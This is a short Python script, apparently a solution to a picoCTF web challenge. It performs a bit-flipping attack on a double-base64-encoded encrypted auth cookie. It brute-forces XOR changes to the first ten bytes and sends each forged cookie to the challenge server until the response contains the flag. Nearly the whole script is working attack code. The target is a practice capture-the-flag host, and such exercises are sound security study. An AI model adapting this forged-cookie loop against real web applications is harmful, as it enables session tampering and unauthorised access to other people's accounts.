import requests
from base64 import b64encode, b64decode
from tqdm import tqdm



def bit_flip(bitPosition, bit ,data):
    list1 = b64decode(b64decode(data))
    changeableByteArray = bytearray(list1)
    changeableByteArray[bitPosition] = changeableByteArray[bitPosition] ^ bit
    finalByteArray = bytes(changeableByteArray)
    return b64encode(b64encode(finalByteArray)).decode()


string = input("Enter the encrypted cookie: ")

for x in tqdm(iterable=range(10), desc='Bruceforcing Position..'):
    for y in tqdm(iterable=range(128), desc='Bruceforcing Bits..'):
        newCookie = bit_flip(x, y, string)
        modifiedCookie = {'auth_name':newCookie}
        site = requests.get('http://mercury.picoctf.net:43275/', cookies=modifiedCookie).text
        if 'picoCTF{' in site:
            print('Flag: ' + site.split("<code>")[1].split("</code>")[0])
            break
        